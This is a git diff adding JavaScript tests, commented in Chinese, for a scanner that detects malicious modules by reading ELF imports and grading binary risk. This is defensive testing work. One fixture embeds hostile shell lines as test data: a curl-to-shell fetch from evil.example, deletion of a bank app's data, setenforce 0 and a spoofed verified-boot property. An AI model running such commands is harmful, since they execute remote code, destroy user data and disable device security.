@@ -5692,3 +5692,430 @@ test('A1-C1 不变量：info 与 low 不等价、豁免只有一处实现点、�
   assert.equal(kept.length, 1, JSON.stringify(kept));
   assert.equal(kept[0].severity, 'info', 'verdict 层只改 snippet/advice，不动等级：' + JSON.stringify(kept[0]));
 });
+
+// ---------------------------------------------------------------------------
+// Task 5.7 —— 把 STRUCT_BINARY 从「我读不了」写成「它一定能做什么」（只加严，永不开自动放行）
+// 工单：.superpowers/sdd/2026-10-12-malicious-module-detection-hardening/briefs/task-5.7.md
+// §0 已推翻计划里那两处：Temp 的 s3-measure2 / s3-project 脚本与 18 包语料都不存在了
+//   ⇒ Step 0 改用常驻的 audit/fixtures/ 真 ELF；S3 的推荐理由换了 ⇒ 本轮一条降级都不做，
+//   §1 那条硬边界由 INV-B + 变异 M2 压着（M2 把非 ELF 那一支写成 info 必须红）。
+// 下面每一格期望值都是本轮在这六枚常驻夹具上量出来的，没有一个数是从计划抄的。
+// 新符号（capabilityFamilies / capabilitySymbols / MAX_FORENSICS_BYTES / 条目上的 raw）
+// 一律走动态取：静态具名 import 在实现落地前会让整个文件在 link 阶段炸掉，
+// 红的应当是本轮新用例，不是那 570 条既有证人。
+// ---------------------------------------------------------------------------
+
+const T57_ELF = await import('./elf-forensics.mjs');
+const T57_SCAN = await import('./scan.mjs');
+
+const T57_SHA1 = (b) => createHash('sha1').update(b).digest('hex');
+/** 本轮量过的夹具字节面。漂了就说明有人换了 ELF 却没重测判据。 */
+const T57_FIX_SHA = {
+  'arm64-v8a.so': '0a25b859e5af1a5cfe436b61be6f829122f3dec8',
+  'device_faker_cli': 'e3dfd27a5cff36946af5d782d259ee397b959276',
+  'hma-arm64.so': 'efa5d78192d6904ea46972b41e8be89bf16c88ad',
+  'hma-x86.so': '48467904a36a6d4cac9dc72af540e8dd21959306',
+  'detach-arm32': '54a7ec1728dc4c4aabec637bb8c10c4ac90c54fb',
+};
+function t57Fix(f) {
+  const b = readFileSync(new URL(`./fixtures/${f}`, import.meta.url));
+  assert.equal(T57_SHA1(b), T57_FIX_SHA[f], `${f} 的字节面与本轮量过的那一份不是同一份`);
+  return b;
+}
+
+const T57_CLEAN_SH = '#!/system/bin/sh\necho ok\n';
+/** 一枚真 PNG（1x1，含 NUL ⇒ detectBinary 认它，forensics 不认它）。 */
+const T57_PNG_SHA = 'b2bbe763c7e1828c750d53f78550709a6fea19be';
+const T57_PNG = Buffer.from(
+  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
+assert.equal(T57_SHA1(T57_PNG), T57_PNG_SHA, 'PNG 夹具字节面钉住');
+/** T4 那一条现成的 polyglot 形状（ELF 魔数 + 五行明文），逐字节与 T4_SHAPE.a1 同一份。 */
+const T57_A1_SHA = '4993af34c77e7c53391388952a237daf360a64fd';
+const T57_A1 = Buffer.concat([
+  Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
+  Buffer.from('#!/system/bin/sh\ncurl -s https://evil.example/a | sh\nrm -rf /data/data/com.bank.app\nsetenforce 0\nresetprop ro.boot.verifiedbootstate green\n', 'utf8')]);
+assert.equal(T57_SHA1(T57_A1), T57_A1_SHA, 'polyglot 夹具字节面钉住');
+/** PNG 头 + 真 ELF 体：魔数是 PNG，取证模块按「不是 ELF」处理，不许念成 ELF。 */
+const T57_PNG_ELF_SHA = '50acf98ed27a349259b0f39cf868fcee20ce0212';
+const t57PngElf = () => {
+  const b = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), t57Fix('hma-arm64.so')]);
+  assert.equal(T57_SHA1(b), T57_PNG_ELF_SHA, 'PNG 头 + ELF 体夹具钉住');
+  return b;
+};
+/** 超过取证字节上限的真 ELF（工单 §5 第 2 条：超限那一格要产生看得见的记录）。 */
+function t57OverCap() {
+  const base = t57Fix('hma-x86.so');
+  const cap = T57_SCAN.MAX_FORENSICS_BYTES;
+  assert.ok(Number.isInteger(cap) && cap > 0, `MAX_FORENSICS_BYTES 必须是正整数常量，实得 ${JSON.stringify(cap)}`);
+  return Buffer.concat([base, Buffer.alloc(cap + 1 - base.length, 0)]);
+}
+
+/** 六个常驻夹具包：两枚 device_faker 真 ELF、一枚 HMA 小 ELF、一枚真 PNG、真 ELF + polyglot、超限 ELF。 */
+const T57_PKGS = {
+  df2: {
+    files: () => [['zygisk/arm64-v8a.so', t57Fix('arm64-v8a.so')], ['bin/device_faker_cli', t57Fix('device_faker_cli')]],
+    high: 2,
+  },
+  detach32: {
+    files: () => [['zygisk/armeabi-v7a.so', t57Fix('detach-arm32')]],
+    high: 1,
+  },
+  hmaSmall: { files: () => [['zygisk/arm64-v8a.so', t57Fix('hma-arm64.so')]], high: 0 },
+  pngOnly: { files: () => [['icons/1x1.png', T57_PNG]], high: 0 },
+  polyglotReal: {
+    files: () => [['assets/payload.bin', T57_A1], ['zygisk/arm64-v8a.so', t57Fix('hma-x86.so')]],
+    high: 0,
+  },
+  pngElf: { files: () => [['assets/mix.png', t57PngElf()]], high: 0 },
+  overCap: { files: () => [['assets/big.elf', t57OverCap()]], high: 0 },
+};
+const T57_ZIPS = new Map();
+const T57_RUNS = new Map();
+function t57Zip(id) {
+  if (!T57_ZIPS.has(id)) {
+    T57_ZIPS.set(id, makeModuleZip({ id: `eval.t57.${id}`, files: [['service.sh', T57_CLEAN_SH], ...T57_PKGS[id].files()] }));
+  }
+  return T57_ZIPS.get(id);
+}
+async function t57Run(id) {
+  if (!T57_RUNS.has(id)) T57_RUNS.set(id, scanToReport(t57Zip(id), { changeType: 'first' }));
+  return T57_RUNS.get(id);
+}
+/** scanZip 交给 checkBinaries 的那份清单（报告里 binaries 就是它的投影，缺 why 不影响档位）。 */
+const t57Bins = (r) => r.binaries.map((b) => ({ name: b.name, id: b.kind, bytes: b.bytes }));
+const t57Struct = (r) => r.findings.filter((f) => f.ruleId === 'STRUCT_BINARY')
+  .slice().sort((a, b) => (a.file < b.file ? -1 : a.file > b.file ? 1 : 0));
+const t57Spots = (r) => t57Struct(r).map((f) => `${f.file}:0/${f.severity}`);
+const t57Row = (r, name) => (r.binaryForensics || []).find((x) => x.name === name) || null;
+
+const T57_BIN1 = [{ name: 'zygisk/arm64-v8a.so', id: 'ELF', why: 'ELF 可执行文件/共享库', bytes: 983624 }];
+const t57Rec = (over = {}) => ({
+  name: 'zygisk/arm64-v8a.so', kind: 'ELF', bytes: 983624, machineName: 'AArch64', type: 'DYN',
+  stripped: true, importCount: 86, sensitiveImports: [], needed: ['libc.so'], ...over,
+});
+/** 纯函数层只喂构造记录，所以第二参两种形状都要认：Map（scan.mjs 用）与朴素对象（工单 §3 的写法）。 */
+const t57Map = (name, rec) => new Map([[name, rec]]);
+
+test('T57-01 向后兼容钉子：不传第二参（或传空表）⇒ 输出与今天逐字相同，一条 STRUCT_BINARY/medium', () => {
+  // 这一段字面量是本轮从改前的 risk-rules.mjs 实测输出的整份发现对象复制的，不是凭记忆写的。
+  const today = [{
+    ruleId: 'STRUCT_BINARY',
+    category: 'structure',
+    severity: 'medium',
+    file: 'zygisk/arm64-v8a.so',
+    line: 0,
+    snippet: 'ELF / 983624 B',
+    message: 'zygisk/arm64-v8a.so 是二进制负载（ELF 可执行文件/共享库），静态行级规则无法审查',
+    advice: '模块可以带二进制（busybox、update-binary 等），但它必须在 module.prop/描述里说明来源，'
+      + '并给出可核对的上游或校验和；匿名可执行文件在 root 下运行等于把判断权交给机器码。',
+  }];
+  assert.deepEqual(checkBinaries(T57_BIN1), today, '省参 == 今天');
+  assert.deepEqual(checkBinaries(T57_BIN1, new Map()), today, '空 Map == 今天（查不中时不许编造取证结论）');
+  assert.deepEqual(checkBinaries(T57_BIN1, {}), today, '空对象 == 今天');
+});
+
+test('T57-02 判据表第一行：非 ELF（forensics 返回 null）⇒ medium，说「不是 ELF，静态取证不适用」，不许写「读不了」', () => {
+  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', null));
+  assert.equal(g.length, 1);
+  assert.equal(g[0].severity, 'medium');
+  assert.match(g[0].message, /不是 ELF/);
+  assert.match(g[0].message, /静态取证不适用/);
+  // §2.7 的口径纪律：非 ELF 不是「读不动」。写成「读不了」就把「看不到」与「看不清」并成一格。
+  assert.doesNotMatch(g[0].message, /读不了|读不出|无法解析|无法审查/);
+  assert.equal(g[0].ruleId, 'STRUCT_BINARY', '不新增 ruleId（工单 §1）');
+  assert.equal(g[0].file, 'zygisk/arm64-v8a.so');
+  assert.equal(g[0].line, 0);
+});
+
+test('T57-03 判据表第二行：ELF 但 parseError ⇒ medium，要说出「头部有 ELF 魔数，但读不出符号表」与原因', () => {
+  const why = 'unexpected ELF64 e_shentsize=40 (accepting only 64)';
+  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', t57Rec({ parseError: why })));
+  assert.equal(g.length, 1);
+  assert.equal(g[0].severity, 'medium');
+  assert.match(g[0].message, /头部有 ELF 魔数/);
+  assert.match(g[0].message, /读不出符号表/);
+  assert.ok(g[0].message.includes(why), `原因要逐字带出来：${g[0].message}`);
+  assert.doesNotMatch(g[0].message, /危险族|链接期/, '读不出就是读不出，不许顺嘴说它干净或它有本事');
+});
+
+test('T57-04 判据表第三行：ELF、危险族 0 类 ⇒ medium，且必须含「这不等于安全」', () => {
+  const rec = t57Rec({ importCount: 24, sensitiveImports: ['close', 'closedir', 'mmap', 'readdir64'] });
+  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', rec));
+  assert.equal(g.length, 1);
+  assert.equal(g[0].severity, 'medium');
+  assert.match(g[0].message, /读到 24 个导入/);
+  assert.match(g[0].message, /无一落在危险族/);
+  assert.match(g[0].message, /不等于安全/);
+  assert.match(g[0].message, /mmap/, '要举得出「不需要 exec 族也能跑机器码」那一格，否则这句是空话');
+});
+
+test('T57-05 判据表第四行：危险族 1 类 ⇒ medium，列出族名与每族至多 5 个代表符号', () => {
+  const exec8 = ['fork', 'clone', 'execve', 'system', 'popen', 'dlopen', 'dlsym', 'vfork'];
+  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', t57Rec({ importCount: 120, sensitiveImports: exec8 })));
+  assert.equal(g.length, 1);
+  assert.equal(g[0].severity, 'medium', '单族不许升 high');
+  assert.match(g[0].message, /1 类危险能力/);
+  assert.match(g[0].message, /EXEC/);
+  for (const s of exec8.slice().sort().slice(0, 5)) assert.ok(g[0].message.includes(s), `代表符号 ${s} 要看得见：${g[0].message}`);
+  assert.match(g[0].message, /共 8 个/, '超 5 个要写明总数，不许静默截断');
+  assert.doesNotMatch(g[0].message, /≥2 类链接期能力/);
+});
+
+test('T57-06 判据表第五行：危险族 ≥2 类 ⇒ high，并写明「≥2 类链接期能力」是升级理由；复断 0 族那一行含「不等于安全」', () => {
+  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so',
+    t57Rec({ sensitiveImports: ['fork', 'socket'] })));
+  assert.equal(g.length, 1);
+  assert.equal(g[0].severity, 'high');
+  assert.match(g[0].message, /≥2 类链接期能力/);
+  assert.match(g[0].message, /EXEC/);
+  assert.match(g[0].message, /NET/);
+  // 工单 §3 明写这一格还要复断第三行的口径：0 族那一行永远不许念成「安全」
+  const zero = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so',
+    t57Rec({ importCount: 24, sensitiveImports: ['close', 'closedir', 'mmap', 'readdir64'] })));
+  assert.equal(zero[0].severity, 'medium');
+  assert.match(zero[0].message, /不等于安全/);
+});
+
+test('T57-07 能力族纯函数：arm64-v8a.so 的真名单逐字断族，外加空数组 / 未知名 / 大小写 / 中性名单四格', () => {
+  const arm = T57_ELF.forensics(t57Fix('arm64-v8a.so'), 'arm64-v8a.so');
+  assert.equal(arm.importCount, 86, 'Step 0 复现值：计划里那个 86 在常驻夹具上对得上');
+  assert.deepEqual(arm.sensitiveImports,
+    ['chdir', 'chroot', 'close', 'dlsym', 'fork', 'ioctl', 'kill', 'mmap', 'mmap64', 'mprotect', 'open',
+      'prctl', 'read', 'readlink', 'recv', 'send', 'sigaction', 'syscall', 'unlink', 'write', 'writev'],
+    'SENSITIVE 那份名单一字未动（工单 §1）');
+  assert.deepEqual(T57_ELF.capabilityFamilies(arm.sensitiveImports), ['EXEC', 'FILEWRITE', 'NET', 'NS']);
+  assert.deepEqual(T57_ELF.capabilitySymbols(arm.sensitiveImports).map((x) => [x.family, x.symbols]), [
+    ['EXEC', ['dlsym', 'fork']],
+    ['FILEWRITE', ['chdir', 'unlink']],
+    ['NET', ['recv', 'send']],
+    ['NS', ['chroot', 'kill', 'prctl', 'sigaction']],
+  ]);
+  assert.equal(T57_ELF.capabilitySymbols(arm.sensitiveImports).length, 4, '4 族 ⇒ 这一枚是 high');
+
+  // 确定性四格：空数组 / 未知名 / 大小写混写 / 中性名单
+  assert.deepEqual(T57_ELF.capabilityFamilies([]), []);
+  assert.deepEqual(T57_ELF.capabilityFamilies(['nope', '__libc_start_main', 'Java_main', 'strlen']), []);
+  assert.deepEqual(T57_ELF.capabilityFamilies(['FORK', 'Socket', 'chroot', '__SYSTEM_PROPERTY_GET', 'UNLINK']),
+    ['EXEC', 'FILEWRITE', 'NET', 'NS', 'PROP'], '大小写混写不许产出第二份族，也不许产不出族');
+  assert.deepEqual(T57_ELF.capabilityFamilies(['fork', 'FORK', 'Fork']), ['EXEC'], '去重');
+  assert.deepEqual(T57_ELF.capabilityFamilies(undefined), [], '非数组输入也要有确定输出');
+  // §2 那条边界：mmap/mprotect/read/write/close/ioctl/syscall 不算危险族 ——
+  // 把它们算进去会把我自己那条「导入表干净 ≠ 安全」的论证说反。
+  assert.deepEqual(T57_ELF.capabilityFamilies(
+    ['mmap', 'mprotect', 'read', 'write', 'close', 'ioctl', 'syscall', 'open', 'opendir', 'readdir64', 'writev']), []);
+  // popen 只归 EXEC：§2 的 FILEWRITE 那一行明写「open/popen 之外」。
+  assert.deepEqual(T57_ELF.capabilityFamilies(['popen']), ['EXEC']);
+
+  // 能力族只许住在一处（§2 标题那句）：判据表在 elf-forensics.mjs，别处不许有第二份词汇。
+  const rrSrc = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
+  for (const [src, at] of [[rrSrc, 'risk-rules.mjs'], [scanSrc, 'scan.mjs']]) {
+    assert.equal(/FILEWRITE|pivot_root|__system_property_|posix_spawn|setns/.test(src), false,
+      `${at} 里不许出现第二份能力族词汇或成员表`);
+  }
+});
+
+test('T57-08 一个条目只出一条：重名条目各出一条，一条也许多不许（§0.7 那个重复记账的病）', () => {
+  const rec = t57Rec({ sensitiveImports: ['fork', 'socket'] });
+  const one = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', rec));
+  assert.equal(one.length, 1, JSON.stringify(one));
+  assert.deepEqual([...new Set(one.map((f) => f.ruleId))], ['STRUCT_BINARY'], '不许顺带产出别的 ruleId');
+  const dup = [T57_BIN1[0], T57_BIN1[0]];
+  const two = checkBinaries(dup, t57Map('zygisk/arm64-v8a.so', rec));
+  assert.equal(two.length, 2, '两个条目就是两条发现，一条不多一条不少');
+  assert.deepEqual(two.map((f) => f.severity), ['high', 'high']);
+  assert.equal(scoreRisk(two).counts.high, 2, '档位只按条目数走，重复计数会虚高');
+});
+
+test('T57-09 超限输入不许被念成「取证成功、0 危险族」（工单 §5 那一格，纯函数层）', () => {
+  const rec = t57Rec({ importCount: 24, sensitiveImports: ['close', 'closedir', 'mmap', 'readdir64'], inputCapped: true, rawBytes: 8388608 });
+  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', rec));
+  assert.equal(g.length, 1);
+  assert.equal(g[0].severity, 'medium');
+  assert.match(g[0].message, /输入不完整/);
+  assert.match(g[0].message, /8388608/, '要写清只喂进去多少字节');
+  assert.doesNotMatch(g[0].message, /无一落在危险族/, '截断过的输入什么都不能证明，不许说「0 族」');
+});
+
+test('T57-10 device_faker 那两枚真 ELF ⇒ high，report.binaryForensics 的 importCount 是 86 / 70', async () => {
+  const r = await t57Run('df2');
+  assert.deepEqual(t57Spots(r), ['bin/device_faker_cli:0/high', 'zygisk/arm64-v8a.so:0/high']);
+  const cli = t57Row(r, 'bin/device_faker_cli');
+  const so = t57Row(r, 'zygisk/arm64-v8a.so');
+  assert.ok(so && cli, `取证登记必须在：${JSON.stringify(r.binaryForensics)}`);
+  assert.equal(so.importCount, 86);
+  assert.equal(cli.importCount, 70);
+  assert.equal(so.parseError, undefined, `真字节必须真读出来，不许每条都 parseError：${JSON.stringify(so)}`);
+  assert.deepEqual(so.families, ['EXEC', 'FILEWRITE', 'NET', 'NS']);
+  assert.deepEqual(cli.families, ['EXEC', 'FILEWRITE', 'NS', 'PROP']);
+  assert.equal(so.entryBytes, 983624);
+  assert.equal(cli.entryBytes, 485944);
+  assert.deepEqual(r.counts, { high: 2, medium: 1, low: 0, info: 0 });
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+  // 字节面没进产物（§5.3 的第一格）
+  assert.equal(JSON.stringify(r).includes('not a raw byte Buffer'), false);
+});
+
+test('T57-11 HMA 那枚小 ELF（24 导入、0 族）⇒ medium，message 说得出「读到 24 个导入」', async () => {
+  const r = await t57Run('hmaSmall');
+  assert.deepEqual(t57Spots(r), ['zygisk/arm64-v8a.so:0/medium']);
+  assert.match(r.findings.find((f) => f.ruleId === 'STRUCT_BINARY').message, /读到 24 个导入/);
+  assert.deepEqual(t57Row(r, 'zygisk/arm64-v8a.so').families, []);
+  assert.equal(t57Row(r, 'zygisk/arm64-v8a.so').importCount, 24);
+  assert.deepEqual(r.counts, { high: 0, medium: 1, low: 0, info: 0 });
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T57-12 非 ELF 两形（真 PNG / PNG 头 + ELF 体）⇒ medium，口径里不许出现「读不了」「无法解析」', async () => {
+  const png = await t57Run('pngOnly');
+  const pRow = t57Struct(png)[0];
+  assert.equal(pRow.severity, 'medium');
+  assert.match(pRow.message, /不是 ELF/);
+  assert.doesNotMatch(pRow.message, /读不了|无法解析|无法审查/);
+  assert.equal(t57Row(png, 'icons/1x1.png').outcome, 'NOT_ELF');
+  assert.deepEqual(png.counts, { high: 0, medium: 1, low: 0, info: 0 });
+
+  const pe = await t57Run('pngElf');
+  const peRow = t57Struct(pe).find((f) => f.file === 'assets/mix.png');
+  assert.equal(peRow.severity, 'medium');
+  assert.doesNotMatch(peRow.message, /读不了|无法解析/);
+  assert.equal(t57Row(pe, 'assets/mix.png').outcome, 'NOT_ELF', 'PNG 头包住 ELF 体也不许冒充读到了 ELF');
+});
+
+test('T57-13 真 ELF + T4 polyglot 同包：polyglot 的账照旧落在 feed，本轮不许挪到取证上', async () => {
+  const r = await t57Run('polyglotReal');
+  assert.deepEqual((r.polyglotFed || []).map((x) => x.name), ['assets/payload.bin'],
+    'feed 那本账一字不动（T4 的证人），取证是另一本账');
+  assert.deepEqual(t57Spots(r), ['assets/payload.bin:0/medium', 'zygisk/arm64-v8a.so:0/medium']);
+  assert.equal(t57Row(r, 'assets/payload.bin').outcome, 'PARSE_ERROR', 'ELF 魔数 + 五行明文不是能解析的 ELF');
+  assert.deepEqual(r.counts, { high: 3, medium: 3, low: 1, info: 0 },
+    '改前实测就是这一组数：内容那五条 + 两条 STRUCT_BINARY，一条不多一条不少');
+});
+
+test('T57-14 超过取证字节上限的真 ELF：raw 正好截在上限，且登记成 INPUT_CAPPED +「输入不完整」', async () => {
+  const cap = T57_SCAN.MAX_FORENSICS_BYTES;
+  assert.equal(cap, T57_ELF.STRING_SCAN_LIMIT, '上限只许有一份，且必须说得出依据');
+  const r = await t57Run('overCap');
+  const row = t57Row(r, 'assets/big.elf');
+  assert.equal(row.outcome, 'INPUT_CAPPED');
+  assert.equal(row.rawBytes, cap, '留下的字节必须正好等于上限，不多留一个字节');
+  assert.equal(row.entryBytes, cap + 1);
+  assert.match(t57Struct(r)[0].message, /输入不完整/);
+  assert.equal(t57Struct(r)[0].severity, 'medium');
+});
+
+test('T57-15 产物里不许有 raw，也不许有 NUL（§5.3 那一格，撑着一段历史事故）', async () => {
+  for (const id of ['df2', 'detach32', 'overCap']) {
+    const r = await t57Run(id);
+    const json = JSON.stringify(r);
+    const rj = renderJSON(r);
+    const md = renderMarkdown(r);
+    assert.equal(/"raw"\s*:/.test(json), false, `${id}：报告里不许出现 raw 字段`);
+    assert.equal(json.includes('\u0000'), false, `${id}：JSON.stringify(report) 里不许有 NUL`);
+    assert.equal(rj.includes('\u0000'), false, `${id}：renderJSON 里不许有 NUL`);
+    assert.equal(md.includes('\u0000'), false, `${id}：renderMarkdown 里不许有 NUL`);
+    // 尺寸上界：这一格是「raw 或其 utf8 糊化结果没漏进产物」的硬证据。
+    // df2 的原始字节 1.47 MB、overCap 单条就 8 MiB，报告只能有 KB 量级。
+    assert.ok(json.length < 200_000, `${id}：报告 JSON ${json.length} B，二进制字节面漏进产物了`);
+    assert.ok(md.length < 200_000, `${id}：Markdown ${md.length} B`);
+  }
+});
+
+test('T57-16 raw 只在 detectBinary 命中处保留：文本条目 raw===null，二进制条目是 Buffer 且有上限闸（§5.1/§5.2）', () => {
+  const cap = T57_SCAN.MAX_FORENSICS_BYTES;
+  assert.ok(Number.isInteger(cap) && cap > 0, `MAX_FORENSICS_BYTES 必须是正整数具名常量：${JSON.stringify(cap)}`);
+  const byName = Object.fromEntries(readZip(t57Zip('df2')).files.map((f) => [f.name, f]));
+  assert.equal(byName['module.prop'].raw, null, '文本条目不许留 Buffer（§5.1：那会把文本条目的内存翻倍）');
+  assert.equal(byName['service.sh'].raw, null);
+  assert.equal(typeof byName['module.prop'].content, 'string', 'content 仍是 utf8 串，本轮不许换形状');
+  assert.ok(Buffer.isBuffer(byName['zygisk/arm64-v8a.so'].raw), '二进制条目必须留住原始字节，否则整套新分支静默失效');
+  assert.equal(byName['zygisk/arm64-v8a.so'].raw.length, 983624);
+  assert.equal(byName['zygisk/arm64-v8a.so'].rawCapped, false);
+  const big = Object.fromEntries(readZip(t57Zip('overCap')).files.map((f) => [f.name, f]));
+  assert.equal(big['assets/big.elf'].raw.length, cap, '超限那条只许留到上限');
+  assert.equal(big['assets/big.elf'].rawCapped, true, '超限那一格要产生看得见的记录，不许静默变成「读不出」');
+});
+
+// ---------------------------------------------------------------------------
+// 三条不变量（工单 §3：本轮真正的价值在这里，不在逐条断言）
+// 批次 = 六个常驻夹具包（含 PNG、polyglot、超限那三格别的形状）
+// ---------------------------------------------------------------------------
+
+const T57_BATCH = Object.keys(T57_PKGS);
+const t57BatchCount = (r) => t57Struct(r).filter((f) => f.severity === 'high').length;
+
+test('INV-A 接线是活的：自动那一份 vs 手动不传 map 的那一份，差集只可能是 medium→high，条数绝不变', async () => {
+  let wiredHigh = 0;
+  let manualHigh = 0;
+  for (const id of T57_BATCH) {
+    const r = await t57Run(id);
+    const wired = t57Struct(r);
+    const manual = checkBinaries(t57Bins(r)).slice().sort((a, b) => (a.file < b.file ? -1 : a.file > b.file ? 1 : 0));
+    assert.equal(manual.length, r.binaries.length, `${id}：不传 map 也要一物一条`);
+    assert.equal(wired.length, manual.length, `${id}：接线前后的条数必须一字不变`);
+    let high = 0;
+    for (let i = 0; i < wired.length; i++) {
+      assert.equal(wired[i].file, manual[i].file, `${id}：按条目名逐条对账`);
+      assert.equal(wired[i].ruleId, 'STRUCT_BINARY');
+      assert.equal(wired[i].line, manual[i].line, `${id}：line 口径不许动`);
+      assert.equal(wired[i].snippet, manual[i].snippet, `${id}：snippet 不许放取证摘要（§2），档位之外一律照旧`);
+      const from = manual[i].severity;
+      const to = wired[i].severity;
+      const up = SEVERITY_ORDER[to] - SEVERITY_ORDER[from];
+      assert.ok(up >= 0, `${id}/${wired[i].file}：档位只增不减，实测 ${from}→${to}`);
+      if (up !== 0) {
+        assert.equal(from, 'medium', `${id}/${wired[i].file}：差集只能从 medium 出发`);
+        assert.equal(to, 'high', `${id}/${wired[i].file}：差集只能落在 high`);
+      }
+      if (to === 'high') high++;
+      if (from === 'high') manualHigh++;
+    }
+    assert.equal(high, T57_PKGS[id].high, `${id}：接线后该升几档是量过的（名字口径或字节口径漂了都会红在这一格）`);
+    wiredHigh += high;
+  }
+  assert.equal(manualHigh, 0, '不传 map 的那一份永远只有 medium（向后兼容的另一面）');
+  assert.equal(wiredHigh, 3, '全批实测 3 条 high：df2 两枚真 ELF + detach-arm32 一枚');
+});
+
+test('INV-B 永不开自动放行：每个 binaries 条目恰好一条参与定级的 STRUCT_BINARY，档位 ∈ {medium, high}', async () => {
+  for (const id of T57_BATCH) {
+    const r = await t57Run(id);
+    assert.notEqual(r.decision.action, 'auto-approve', `${id}：含二进制的包永远不许落到自动通道`);
+    const sb = t57Struct(r);
+    assert.deepEqual(r.binaries.map((b) => b.name).slice().sort(), sb.map((f) => f.file),
+      `${id}：按条目名逐条对账，不是数总数`);
+    for (const f of sb) {
+      assert.ok(countsTowardRisk(f), `${id}/${f.file}：这条必须参与定级（写成 info 就是开了自动放行的口子）`);
+      assert.ok(f.severity === 'medium' || f.severity === 'high',
+        `${id}/${f.file}：档位只能是 medium 或 high，实测 ${f.severity}`);
+    }
+    assert.ok(r.counts.medium + r.counts.high >= r.binaries.length, `${id}：条数下限`);
+  }
+});
+
+test('INV-C 档位只增不减：同批包 counts.medium + counts.high 在改动前后相等，high 只许变大', async () => {
+  let beforeTotal = 0;
+  let afterTotal = 0;
+  let beforeHigh = 0;
+  let afterHigh = 0;
+  for (const id of T57_BATCH) {
+    const r = await t57Run(id);
+    // 「改动前」用常驻代码自己算出来：把这一批 STRUCT_BINARY 换成不传 map 的那一份再定级。
+    const before = scoreRisk([...r.findings.filter((f) => f.ruleId !== 'STRUCT_BINARY'), ...checkBinaries(t57Bins(r))]);
+    assert.equal(before.counts.medium + before.counts.high, r.counts.medium + r.counts.high,
+      `${id}：参与定级的条数守恒（改前 ${JSON.stringify(before.counts)} / 改后 ${JSON.stringify(r.counts)}）`);
+    assert.equal(before.counts.low, r.counts.low, `${id}：low 也不许多出来`);
+    assert.equal(before.counts.info, r.counts.info, `${id}：info 多出来 == 有一条被降级了`);
+    assert.ok(r.counts.high >= before.counts.high, `${id}：high 只许变大`);
+    assert.ok(r.riskLevel === before.level || r.riskLevel === 'high', `${id}：整包等级只许更严`);
+    beforeTotal += before.counts.medium + before.counts.high;
+    afterTotal += r.counts.medium + r.counts.high;
+    beforeHigh += before.counts.high;
+    afterHigh += r.counts.high;
+  }
+  assert.equal(afterTotal, beforeTotal, '全批守恒');
+  assert.equal(beforeHigh, 0, '改前全批 0 条 high（本轮实测）');
+  assert.equal(afterHigh, 3, '改后全批 3 条 high（本轮实测）');
+  assert.equal(t57BatchCount(await t57Run('df2')), 2, 'df2 两枚真 ELF 必须都升 high');
+});
